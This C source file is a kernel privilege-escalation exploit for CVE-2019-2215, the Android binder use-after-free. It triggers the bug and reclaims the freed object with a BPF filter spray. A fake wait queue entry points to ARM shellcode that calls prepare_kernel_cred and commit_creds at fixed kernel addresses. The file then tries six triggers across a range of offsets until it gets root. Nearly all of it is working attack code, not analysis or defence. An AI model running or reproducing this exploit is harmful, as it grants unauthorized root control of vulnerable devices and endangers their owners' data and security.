/*
 * binder_uaf_trigger.c — Find the right UAF trigger for function ptr call
 *
 * We confirmed: BPF spray reclaims freed binder_thread in kmalloc-256.
 * epoll_ctl DEL just does list_del (harmless write).
 *
 * For function pointer execution, we need wake_up(&thread->wait) to be
 * called where thread->wait is now our BPF data.
 *
 * Potential triggers:
 * 1. Another binder ioctl (WRITE_READ) with data → binder tries to wake thread
 * 2. epoll_wait → calls ep_poll → might trigger binder_poll → accesses thread->wait
 * 3. close(binder_fd) → binder_release → binder_deferred_flush → might wake threads
 * 4. Process exit → binder_deferred_release → walks all threads
 * 5. Sending a binder transaction from another process
 *
 * Test: Do each trigger AFTER spray, monitor for crashes/root.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ    _IOWR('b', 1, struct bwr)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT   _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE     (128 * 1024)

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0
#define BPF_INSNS 26

struct bwr {
    signed long write_size, write_consumed;
    unsigned long write_buffer;
    signed long read_size, read_consumed;
    unsigned long read_buffer;
};

static void pin_cpu(int cpu) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
}

static void *setup_shellcode(void) {
    void *p = mmap((void*)0x42000000, 4096,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (p == MAP_FAILED) return NULL;

    uint32_t sc[] = {
        0xe92d4010,  /* push {r4, lr} */
        0xe3a00000,  /* mov r0, #0 */
        0xe59f4010,  /* ldr r4, [pc, #16] */
        0xe12fff34,  /* blx r4 */
        0xe59f4008,  /* ldr r4, [pc, #8] */
        0xe12fff34,  /* blx r4 */
        0xe3a00000,  /* mov r0, #0 */
        0xe8bd8010,  /* pop {r4, pc} */
        PREPARE_KERNEL_CRED,
        COMMIT_CREDS,
    };
    memcpy(p, sc, sizeof(sc));

    /* Fake wait_queue_entry at 0x42000200 */
    uint32_t *fake = (uint32_t*)((char*)p + 0x200);
    fake[0] = 0;                     /* flags */
    fake[1] = 0;                     /* private */
    fake[2] = 0x42000000;            /* func → shellcode */
    fake[3] = (uint32_t)&fake[3];    /* next → self */
    fake[4] = (uint32_t)&fake[3];    /* prev → self */

    return p;
}

static void build_bpf_payload(struct sock_filter *insns, int wait_off) {
    /* Fill with valid BPF_RET instructions */
    for (int i = 0; i < BPF_INSNS; i++)
        insns[i] = (struct sock_filter){0x06, 0, 0, 0xFFFF};

    /* Overlay fake wait_queue_head at wait_off */
    uint8_t buf[256];
    memset(buf, 0, sizeof(buf));
    for (int i = 0; i < BPF_INSNS; i++) {
        int off = 20 + i * 8;
        if (off + 8 <= 256) {
            *(uint16_t*)(buf + off) = insns[i].code;
            buf[off + 2] = insns[i].jt;
            buf[off + 3] = insns[i].jf;
            *(uint32_t*)(buf + off + 4) = insns[i].k;
        }
    }

    if (wait_off + 12 <= 20 + BPF_INSNS * 8) {
        *(uint32_t*)(buf + wait_off + 0) = 0;            /* lock = unlocked */
        *(uint32_t*)(buf + wait_off + 4) = 0x42000200;   /* next → fake */
        *(uint32_t*)(buf + wait_off + 8) = 0x42000200;   /* prev → fake */
    }

    for (int i = 0; i < BPF_INSNS; i++) {
        int off = 20 + i * 8;
        if (off + 8 <= 256) {
            insns[i].code = *(uint16_t*)(buf + off);
            insns[i].jt = buf[off + 2];
            insns[i].jf = buf[off + 3];
            insns[i].k = *(uint32_t*)(buf + off + 4);
        }
    }
    insns[BPF_INSNS - 1] = (struct sock_filter){0x06, 0, 0, 0xFFFF};
}

/* Spray BPF filters with payload */
static int spray_bpf(int *socks, int count, int wait_off) {
    struct sock_filter insns[BPF_INSNS];
    build_bpf_payload(insns, wait_off);
    struct sock_fprog fp = { .len = BPF_INSNS, .filter = insns };
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[i] < 0) continue;
        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &fp, sizeof(fp)) == 0)
            sprayed++;
    }
    return sprayed;
}

/*
 * Run one exploit attempt with a specific trigger type.
 * Returns: 0 = root, 1 = no root, -1 = error
 */
static int try_trigger(int trigger_type, int wait_off) {
    pin_cpu(0);
    void *sc = setup_shellcode();
    if (!sc) return -1;

    /* Create 50 binder UAFs for maximum reclaim chance */
    int bfds[50], epfds[50];
    for (int i = 0; i < 50; i++) {
        bfds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfds[i] < 0) { printf("binder open fail at %d\n", i); break; }
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfds[i], 0);
        uint32_t z = 0;
        ioctl(bfds[i], BINDER_SET_MAX_THREADS, &z);
        epfds[i] = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
        int32_t d = 0;
        ioctl(bfds[i], BINDER_THREAD_EXIT, &d);
    }

    /* Spray */
    int socks[200];
    int sprayed = spray_bpf(socks, 200, wait_off);

    uid_t before = getuid();

    /* TRIGGER based on type */
    switch (trigger_type) {
    case 0: /* epoll_ctl DEL (write primitive only) */
        for (int i = 0; i < 50; i++) {
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, bfds[i], &ev);
        }
        break;

    case 1: /* close(epfd) → ep_free → ep_unregister_pollwait */
        for (int i = 0; i < 50; i++)
            close(epfds[i]);
        break;

    case 2: /* BINDER_WRITE_READ with read → tries to wait on thread */
        for (int i = 0; i < 50; i++) {
            char rbuf[256];
            struct bwr bwr = {0};
            bwr.read_size = sizeof(rbuf);
            bwr.read_buffer = (unsigned long)rbuf;
            /* This should fail/return immediately since thread was freed
             * but creates a new thread → new thread might use freed wait queue? */
            ioctl(bfds[i], _IOWR('b', 1, struct bwr), &bwr);
        }
        break;

    case 3: /* close(binder_fd) → binder_release → flushes/cleans up */
        for (int i = 0; i < 50; i++) {
            close(epfds[i]);
            close(bfds[i]);
        }
        break;

    case 4: /* epoll_wait with short timeout → calls binder_poll */
        for (int i = 0; i < 50; i++) {
            struct epoll_event events[1];
            /* -1 = block, 0 = return immediately, 1 = 1ms */
            epoll_wait(epfds[i], events, 1, 0);
        }
        break;

    case 5: /* epoll_wait then DEL */
        for (int i = 0; i < 50; i++) {
            struct epoll_event events[1];
            epoll_wait(epfds[i], events, 1, 1);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, bfds[i], &ev);
        }
        break;
    }

    uid_t after = getuid();

    /* Cleanup */
    for (int i = 0; i < sprayed; i++) if (socks[i] >= 0) close(socks[i]);
    if (trigger_type != 1 && trigger_type != 3) {
        for (int i = 0; i < 50; i++) { close(bfds[i]); close(epfds[i]); }
    } else if (trigger_type == 1) {
        for (int i = 0; i < 50; i++) close(bfds[i]);
    }
    munmap(sc, 4096);

    if (after == 0) {
        printf("  *** ROOT! uid=%d→%d ***\n", before, after);
        return 0;
    }
    return 1;
}

int main(void) {
    printf("=== CVE-2019-2215 Trigger Test ===\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    char *trigger_names[] = {
        "epoll_ctl DEL",
        "close(epfd)",
        "BINDER_WRITE_READ",
        "close(binder)",
        "epoll_wait(0ms)",
        "epoll_wait+DEL"
    };

    /* Test each trigger at a few likely offsets */
    int offsets[] = {36, 44, 52, 60, 68, 76, 84, 92, 100, 108, 116, 124};
    int noff = sizeof(offsets) / sizeof(offsets[0]);

    for (int t = 0; t < 6; t++) {
        printf("--- Trigger %d: %s ---\n", t, trigger_names[t]);
        for (int o = 0; o < noff; o++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(5);
                int r = try_trigger(t, offsets[o]);
                _exit(r == 0 ? 42 : 0);
            }
            int status;
            waitpid(pid, &status, 0);
            printf("  off=%3d: ", offsets[o]);
            if (WIFEXITED(status)) {
                if (WEXITSTATUS(status) == 42) {
                    printf("ROOT!\n");
                    try_trigger(t, offsets[o]);
                    return 0;
                }
                printf("ok\n");
            } else if (WIFSIGNALED(status)) {
                printf("CRASH sig=%d *** UAF HIT! ***\n", WTERMSIG(status));
            }
        }
    }

    printf("\n--- dmesg ---\n"); fflush(stdout);
    system("dmesg 2>/dev/null | tail -20 | grep -iE 'oops|bug|panic|fault|binder|Backtrace|Unable|PC.is|BUG' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
